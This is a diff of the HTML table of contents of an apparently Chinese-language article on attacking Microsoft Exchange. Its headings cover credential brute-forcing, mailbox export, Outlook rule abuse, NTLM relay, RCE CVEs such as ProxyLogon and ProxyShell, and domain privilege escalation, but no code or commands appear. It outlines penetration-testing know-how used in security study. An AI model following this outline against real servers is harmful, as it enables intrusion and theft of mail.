 	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
 	   <div id="toc" class="toc collapse in">
 		   <span class="toc-title">Contents</span>
-			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E8%AE%A4%E8%AF%86Exchange"><span class="toc-article-text">认识Exchange</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%92%E8%89%B2"><span class="toc-article-text">邮件服务器角色</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exchange2010"><span class="toc-article-text">Exchange2010</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exchange2013"><span class="toc-article-text">Exchange2013</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exchange16-amp-19"><span class="toc-article-text">Exchange16&amp;19</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%8E%A5%E5%8F%A3-amp-%E5%8D%8F%E8%AE%AE"><span class="toc-article-text">接口&amp;协议</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#OWA"><span class="toc-article-text">OWA</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ECP"><span class="toc-article-text">ECP</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Outlook-anywhere"><span class="toc-article-text">Outlook anywhere</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#MAPI"><span class="toc-article-text">MAPI</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#EAS"><span class="toc-article-text">EAS</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#EWS"><span class="toc-article-text">EWS</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8A%9F%E8%83%BD-amp-%E6%9C%8D%E5%8A%A1"><span class="toc-article-text">功能&amp;服务</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0"><span class="toc-article-text">自动发现</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%85%A8%E5%B1%80%E5%9C%B0%E5%9D%80%E8%A1%A8"><span class="toc-article-text">全局地址表</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%8F%91%E7%8E%B0Exchange"><span class="toc-article-text">发现Exchange</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AE%9A%E4%BD%8DExchange"><span class="toc-article-text">定位Exchange</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%9F%9F%E5%A4%96%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">域外定位</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2"><span class="toc-article-text">空间搜索</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E7%89%B9%E6%AE%8A%E5%9F%9F%E5%90%8D"><span class="toc-article-text">特殊域名</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E7%89%B9%E6%AE%8A%E6%8E%A5%E5%8F%A3"><span class="toc-article-text">特殊接口</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%9F%9F%E5%86%85%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">域内定位</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#SPN%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">SPN定位</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#SRV%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">SRV定位</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#LDAP%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">LDAP定位</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#Port%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">Port定位</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86Exchange"><span class="toc-article-text">信息收集Exchange</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E7%89%88%E6%9C%AC"><span class="toc-article-text">获取版本</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96IP"><span class="toc-article-text">获取IP</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BF%A1%E6%81%AF"><span class="toc-article-text">获取服务器信息</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%B8%97%E9%80%8FExchange"><span class="toc-article-text">渗透Exchange</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Exchange%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9"><span class="toc-article-text">Exchange外围打点</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81"><span class="toc-article-text">获取凭证</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%88%86%E7%A0%B4%E5%87%AD%E8%AF%81"><span class="toc-article-text">爆破凭证</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96AD%E5%9F%9F%E5%90%8D"><span class="toc-article-text">获取AD域名</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#nmap"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#MailSniper-ps1"><span class="toc-article-text">MailSniper.ps1</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D%E7%88%86%E7%A0%B4"><span class="toc-article-text">用户名爆破</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#Burp"><span class="toc-article-text">Burp</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#MailSniper-ps1-1"><span class="toc-article-text">MailSniper.ps1</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-article-text">密码爆破</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#Burp-1"><span class="toc-article-text">Burp</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#EBurst"><span class="toc-article-text">EBurst</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#MailSniper-ps1-2"><span class="toc-article-text">MailSniper.ps1</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ProxyLogon"><span class="toc-article-text">ProxyLogon</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ProxyShell"><span class="toc-article-text">ProxyShell</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%8B%A5%E6%9C%89%E5%87%AD%E8%AF%81"><span class="toc-article-text">拥有凭证</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AF%BC%E5%87%BA%E9%82%AE%E7%AE%B1"><span class="toc-article-text">导出邮箱</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87RPC"><span class="toc-article-text">通过RPC</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87EWS"><span class="toc-article-text">通过EWS</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87MAPI"><span class="toc-article-text">通过MAPI</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87OAB"><span class="toc-article-text">通过OAB</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87OWA"><span class="toc-article-text">通过OWA</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87LDAP"><span class="toc-article-text">通过LDAP</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%90%9C%E7%B4%A2%E9%82%AE%E4%BB%B6"><span class="toc-article-text">搜索邮件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#MailSniper-ps1-3"><span class="toc-article-text">MailSniper.ps1</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#ewManage"><span class="toc-article-text">ewManage</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AF%BC%E5%87%BA%E9%82%AE%E4%BB%B6"><span class="toc-article-text">导出邮件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%90%9C%E7%B4%A2%E5%85%B1%E4%BA%AB"><span class="toc-article-text">搜索共享</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%90%9C%E7%B4%A2%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-article-text">搜索域信息</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%82%AE%E7%AE%B1%E6%9D%83%E9%99%90%E5%A7%94%E6%B4%BE"><span class="toc-article-text">邮箱权限委派</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%85%8D%E5%90%88SSRF%E8%BF%9B%E8%A1%8C%E4%B8%AD%E7%BB%A7"><span class="toc-article-text">配合SSRF进行中继</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#RCE"><span class="toc-article-text">RCE</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#CVE-2020-0688"><span class="toc-article-text">CVE-2020-0688</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#CVE-2020-17144"><span class="toc-article-text">CVE-2020-17144</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#CVE-2021-27065"><span class="toc-article-text">CVE-2021-27065</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#ProxyLogon-1"><span class="toc-article-text">ProxyLogon</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#proxyshell"><span class="toc-article-text">proxyshell</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%BB%A5%E7%94%A8Outlook%E5%8A%9F%E8%83%BD"><span class="toc-article-text">滥用Outlook功能</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#Froms"><span class="toc-article-text">Froms</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#Rules"><span class="toc-article-text">Rules</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#HomePage"><span class="toc-article-text">HomePage</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Exchange-%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-article-text">Exchange 后渗透</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#NTLM-Relay"><span class="toc-article-text">NTLM Relay</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Relay%E5%88%B0ews%E6%8E%A5%E5%8F%A3"><span class="toc-article-text">Relay到ews接口</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#ExchangeRelayX"><span class="toc-article-text">ExchangeRelayX</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#NtlmRelayToEWS"><span class="toc-article-text">NtlmRelayToEWS</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E8%AE%A4%E8%AF%86Exchange"><span class="toc-article-text">认识Exchange</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%92%E8%89%B2"><span class="toc-article-text">邮件服务器角色</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exchange2010"><span class="toc-article-text">Exchange2010</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exchange2013"><span class="toc-article-text">Exchange2013</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Exchange16-amp-19"><span class="toc-article-text">Exchange16&amp;19</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%8E%A5%E5%8F%A3-amp-%E5%8D%8F%E8%AE%AE"><span class="toc-article-text">接口&amp;协议</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#OWA"><span class="toc-article-text">OWA</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ECP"><span class="toc-article-text">ECP</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Outlook-anywhere"><span class="toc-article-text">Outlook anywhere</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#MAPI"><span class="toc-article-text">MAPI</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#EAS"><span class="toc-article-text">EAS</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#EWS"><span class="toc-article-text">EWS</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8A%9F%E8%83%BD-amp-%E6%9C%8D%E5%8A%A1"><span class="toc-article-text">功能&amp;服务</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0"><span class="toc-article-text">自动发现</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%85%A8%E5%B1%80%E5%9C%B0%E5%9D%80%E8%A1%A8"><span class="toc-article-text">全局地址表</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%8F%91%E7%8E%B0Exchange"><span class="toc-article-text">发现Exchange</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AE%9A%E4%BD%8DExchange"><span class="toc-article-text">定位Exchange</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%9F%E5%A4%96%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">域外定位</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2"><span class="toc-article-text">空间搜索</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E7%89%B9%E6%AE%8A%E5%9F%9F%E5%90%8D"><span class="toc-article-text">特殊域名</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E7%89%B9%E6%AE%8A%E6%8E%A5%E5%8F%A3"><span class="toc-article-text">特殊接口</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%9F%9F%E5%86%85%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">域内定位</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#SPN%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">SPN定位</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#SRV%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">SRV定位</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#LDAP%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">LDAP定位</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#Port%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">Port定位</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86Exchange"><span class="toc-article-text">信息收集Exchange</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E7%89%88%E6%9C%AC"><span class="toc-article-text">获取版本</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96IP"><span class="toc-article-text">获取IP</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BF%A1%E6%81%AF"><span class="toc-article-text">获取服务器信息</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%B8%97%E9%80%8FExchange"><span class="toc-article-text">渗透Exchange</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Exchange%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9"><span class="toc-article-text">Exchange外围打点</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81"><span class="toc-article-text">获取凭证</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%88%86%E7%A0%B4%E5%87%AD%E8%AF%81"><span class="toc-article-text">爆破凭证</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96AD%E5%9F%9F%E5%90%8D"><span class="toc-article-text">获取AD域名</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#nmap"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#MailSniper-ps1"><span class="toc-article-text">MailSniper.ps1</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D%E7%88%86%E7%A0%B4"><span class="toc-article-text">用户名爆破</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#Burp"><span class="toc-article-text">Burp</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#MailSniper-ps1-1"><span class="toc-article-text">MailSniper.ps1</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-article-text">密码爆破</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#Burp-1"><span class="toc-article-text">Burp</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#EBurst"><span class="toc-article-text">EBurst</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#MailSniper-ps1-2"><span class="toc-article-text">MailSniper.ps1</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Exchange-%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-article-text">Exchange 后渗透</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%99%AE%E9%80%9A%E5%87%AD%E8%AF%81"><span class="toc-article-text">普通凭证</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%BC%E5%87%BA%E9%82%AE%E7%AE%B1"><span class="toc-article-text">导出邮箱</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87RPC"><span class="toc-article-text">通过RPC</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87EWS"><span class="toc-article-text">通过EWS</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87MAPI"><span class="toc-article-text">通过MAPI</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87OAB"><span class="toc-article-text">通过OAB</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87OWA"><span class="toc-article-text">通过OWA</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87LDAP"><span class="toc-article-text">通过LDAP</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%90%9C%E7%B4%A2%E9%82%AE%E4%BB%B6"><span class="toc-article-text">搜索邮件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#MailSniper-ps1-3"><span class="toc-article-text">MailSniper.ps1</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ewManage"><span class="toc-article-text">ewManage</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%BC%E5%87%BA%E9%82%AE%E4%BB%B6"><span class="toc-article-text">导出邮件</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%90%9C%E7%B4%A2%E5%85%B1%E4%BA%AB"><span class="toc-article-text">搜索共享</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%90%9C%E7%B4%A2%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-article-text">搜索域信息</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%82%AE%E7%AE%B1%E6%9D%83%E9%99%90%E5%A7%94%E6%B4%BE"><span class="toc-article-text">邮箱权限委派</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%BB%A5%E7%94%A8Outlook%E5%8A%9F%E8%83%BD"><span class="toc-article-text">滥用Outlook功能</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Froms"><span class="toc-article-text">Froms</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Rules"><span class="toc-article-text">Rules</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#HomePage"><span class="toc-article-text">HomePage</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%85%8D%E5%90%88SSRF%E8%BF%9B%E8%A1%8C%E4%B8%AD%E7%BB%A7"><span class="toc-article-text">配合SSRF进行中继</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%94%A8%E6%88%B7%E7%BB%84%E6%8F%90%E6%9D%83"><span class="toc-article-text">用户组提权</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#NTLM-Relay"><span class="toc-article-text">NTLM Relay</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Relay%E5%88%B0ews%E6%8E%A5%E5%8F%A3"><span class="toc-article-text">Relay到ews接口</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6"><span class="toc-article-text">发送邮件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%89%8B%E5%8A%A8%E5%8F%91%E9%80%81"><span class="toc-article-text">手动发送</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#awaks"><span class="toc-article-text">awaks</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ExchangeRelayX"><span class="toc-article-text">ExchangeRelayX</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NtlmRelayToEWS"><span class="toc-article-text">NtlmRelayToEWS</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Relay-to-LDAP"><span class="toc-article-text">Relay to LDAP</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#RCE"><span class="toc-article-text">RCE</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#CVE-2020-0688"><span class="toc-article-text">CVE-2020-0688</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#CVE-2020-17144"><span class="toc-article-text">CVE-2020-17144</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#CVE-2021-27065"><span class="toc-article-text">CVE-2021-27065</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#CVE-2024-21413"><span class="toc-article-text">CVE-2024-21413</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#ProxyLogon"><span class="toc-article-text">ProxyLogon</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#proxyshell"><span class="toc-article-text">proxyshell</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%AE%A1%E7%90%86Exchange"><span class="toc-article-text">管理Exchange</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%AB%98%E6%9D%83%E9%99%90%E5%9F%9F%E8%B4%A6%E5%8F%B7"><span class="toc-article-text">高权限域账号</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#EX%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90"><span class="toc-article-text">EX服务器权限</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2"><span class="toc-article-text">全局搜索</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#PowerShell-%E6%9F%A5%E8%AF%A2"><span class="toc-article-text">PowerShell 查询</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#EWS-%E6%9F%A5%E8%AF%A2"><span class="toc-article-text">EWS 查询</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E5%9F%9F%E7%AE%A1"><span class="toc-article-text">攻击域管</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ACL%E5%9F%9F%E6%8F%90%E6%9D%83"><span class="toc-article-text">ACL域提权</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%B7%B2%E6%9C%89Ex%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90"><span class="toc-article-text">已有Ex服务器权限</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%B7%B2%E6%9C%89%E9%AB%98%E6%9D%83%E9%99%90%E5%9F%9F%E8%B4%A6%E5%8F%B7"><span class="toc-article-text">已有高权限域账号</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
 		</div>
 	
 	</div>
